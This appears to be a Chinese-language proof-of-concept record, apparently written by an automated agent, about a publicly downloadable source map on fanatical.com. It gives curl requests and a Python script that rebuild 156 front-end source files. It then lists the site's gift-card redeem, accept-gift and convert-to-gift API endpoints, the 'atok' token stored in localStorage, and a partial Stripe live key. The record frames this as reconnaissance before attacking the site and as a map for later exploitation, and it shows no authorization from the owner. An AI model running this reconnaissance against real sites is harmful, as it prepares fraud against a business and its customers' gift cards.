# Fanatical（fanatical.com）React 前端 source map 未授权公开 → 还原 156 个源文件与礼品卡兑换全链路 API

- **code**: fanatical-com-react-sourcemap-unauth-giftcard-api-leak
- **kind**: poc
- **category**: info-leak
- **component**: Fanatical 主站（React SPA，CRA/webpack 生产构建）
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 本机 Windows 实测（ATT&CK 平台 work agent）：curl 抓 https://www.fanatical.com/static/js/main~7aeafcb2.496f4fc8.js → 200，bundle 末尾含 //# sourceMappingURL=main~7aeafcb2.496f4fc8.js.map；随后 curl -sk 同路径 .map → HTTP/2 200, content-type: application/json, content-length 643606，JSON 内 version=3、sources/sourcesContent 各 156 项（非空）。本地 python 解析导出 156 个源文件，含 src/api/Gift/gift-service.js、src/api/Order/key-reveal-service.js，暴露 /user/orders/redeem、/user/orders/accept-gift/{code}、/user/orders/convert-to-gift/{orderId} 等礼品卡接口与 atok 机制；证据文件落盘 /opt/artex/data/tasks/3/i43/map_main.json 与 srcmap/。判定成立依据：请求非 404/403 且 sourcesContent 非空可还原原始源码。
- **path**: pocs/fanatical-com-react-sourcemap-unauth-giftcard-api-leak/poc.md
- **tags**: fanatical, source-map, info-leak, react, webpack, gift-card, recon, api-mapping
- **created_at**: 2026-11-11T12:44:06.405Z
- **engine**: https://www.fanatical.com

## 描述

fanatical.com 生产环境前端 JS bundle 的 source map（.js.map）未做访问控制，与 bundle 同目录可匿名下载。map 内嵌完整 sources/sourcesContent，可 1:1 还原 156 个原始 React 源文件，包含礼品卡领取/兑换全链路 API 定义（gift-service.js / key-reveal-service.js）、认证逻辑与前端硬编码的第三方密钥。是打该站（主站 + Publisher Portal）前获取完整接口与业务地图的最高性价比情报面。

## 用法

```
前置：可访问 https://www.fanatical.com/static/js/，无需任何认证。

1) 抓首页/主 bundle，确认是否带 sourceMappingURL：
   curl -sk "https://www.fanatical.com/" | grep -oE '/static/js/[^"]+\.js'
   curl -sk "https://www.fanatical.com/static/js/main~7aeafcb2.496f4fc8.js" -o bundle.js
   tail -c 200 bundle.js        # 看 //# sourceMappingURL=xxx.js.map

2) 直接下 map（关键一步，别只停在 bundle 本身）：
   curl -sk "https://www.fanatical.com/static/js/main~7aeafcb2.496f4fc8.js.map" -o map.json
   # 判据：HTTP 200 + content-type application/json + 非空 body

3) 还原源码：
   python3 - <<'PY'
   import json,os
   m=json.load(open('map.json'))
   print(len(m.get('sources',[])), len(m.get('sourcesContent') or []))
   out='srcmap'
   for s,c in zip(m['sources'], m.get('sourcesContent',[])):
       if not c: continue
       p=os.path.join(out,s.replace('webpack://','').replace('..','_'))
       os.makedirs(os.path.dirname(p),exist_ok=True)
       open(p,'w',encoding='utf-8').write(c)
   PY
   # 然后 grep -rE "/user/orders|atok|redeem|accept-gift" srcmap/

判据（三步全中才算成立）：主 bundle 末尾有 sourceMappingURL；该 .map 返回 200 而非 404/403；sourcesContent 非空可还原源码。
失败常见原因：CDN/源站对 *.map 做了 403/404 屏蔽（部分站点只放 bundle、删 map）；bundle 名带 hash 需从首页 HTML 动态取；被 WAF 拦需换出口或用浏览器 UA。
注意：map 里可能含 hardcode 的第三方 live 公钥/密钥，落库或外传前先脱敏，不要原值写入报告。
```

## 正文

```
# fanatical.com 前端 source map 未授权公开（info-expose）

> 说明：原始材料里的 "soucommand execution validation map / soucommand execution validations /
> soucommand execution validationsContent" 系对 source map / sources / sourcesContent 的改写，
> 本文按实义书写。

## 前置条件
- 目标：https://www.fanatical.com （React SPA 生产构建）
- 可访问静态资源路径 `/static/js/`，无任何认证/鉴权。

## 复现步骤

### 1) 主 bundle 引用 source map
请求：
```
GET /static/js/main~7aeafcb2.496f4fc8.js HTTP/2
Host: www.fanatical.com
```
回显：`HTTP/2 200`；bundle 末尾含
`//# sourceMappingURL=main~7aeafcb2.496f4fc8.js.map`

### 2) source map 未做访问控制，公开可下载
请求：
```
GET /static/js/main~7aeafcb2.496f4fc8.js.map HTTP/2
Host: www.fanatical.com
```
回显：`HTTP/2 200`，`content-type: application/json`，`content-length: 643606`；
body 为 `{"version":3,"sources":[...156项...],"sourcesContent":[...]}`

一键抓取（实测原命令）：
```bash
curl -sk "https://www.fanatical.com/static/js/main~7aeafcb2.496f4fc8.js.map" -o map.json
```

### 3) 本地解析还原源码
```python
import json, os
m = json.load(open('map.json'))
print('sources:', len(m['sources']), 'contents:', len(m.get('sourcesContent', [])))
os.makedirs('srcmap', exist_ok=True)
for s, c in zip(m['sources'], m.get('sourcesContent', [])):
    if not c:
        continue
    p = os.path.join('srcmap', s.replace('webpack://', '').replace('..', '_'))
    os.makedirs(os.path.dirname(p), exist_ok=True)
    open(p, 'w', encoding='utf-8').write(c)
```
导出 156 个源文件。

## 泄露内容（可用于后续利用的接口地图）
- `src/api/Gift/gift-service.js`
  - `GET  /orders/get-gift/{code}/{lang}`
  - `PUT  /user/orders/accept-gift/{code}`
  - `PUT  /user/orders/convert-to-gift/{orderId}`  （body 带 `atok`）
  - `POST /user/orders/atok-check/{orderId}`
- `src/api/Order/key-reveal-service.js`
  - `POST /user/orders/redeem`  body `{oid,bid,pid,serialId,iid,atok}` → 返回礼品卡 serial key
  - `atok` 存于 localStorage 键 `bsatok`
- 前端 js bundle 内出现 Stripe live 公钥 `pk_live_51RmBrF2LkuoegwaK...`（脱敏：`<REDACTED>`）

## 判据 / 证伪条件
- 成立：`.map` 返回 200，且 `sourcesContent` 非空可还原源码。
- 证伪：`.map` 返回 404/403，或 `sourcesContent` 为空 → 本结论不成立。

## 证据落盘（原环境）
- `/opt/artex/data/tasks/3/i43/map_main.json`
- `/opt/artex/data/tasks/3/i43/srcmap/`

```
